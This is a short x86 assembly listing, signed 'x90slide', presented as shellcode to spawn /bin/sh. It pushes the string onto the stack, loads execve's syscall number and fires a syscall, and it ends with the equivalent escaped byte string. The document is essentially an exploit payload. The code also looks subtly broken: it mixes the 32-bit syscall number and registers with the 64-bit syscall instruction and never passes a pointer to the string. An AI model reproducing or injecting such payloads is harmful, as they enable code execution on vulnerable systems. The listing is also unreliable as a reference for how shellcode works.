# Shellcode by x90slide

.global _start
_start:
.intel_syntax noprefix
	mov al, 0x0b
	xor ebx, ebx
	mov bx, 0x6873
	shl ebx, 8
	mov bl, 0x2f
	push ebx
	mov ebx, 0x6e69622f
	push ebx
	xor ecx, ecx
	xor edx, edx
	syscall

# "\xB0\x0B\x31\xDB\x66\xBB\x73\x68\xC1\xE3\x08\xB3\x2F\x53\xBB\x2F\x62\x69\x6E\x53\x31\xC9\x31\xD2\x0F\x05"
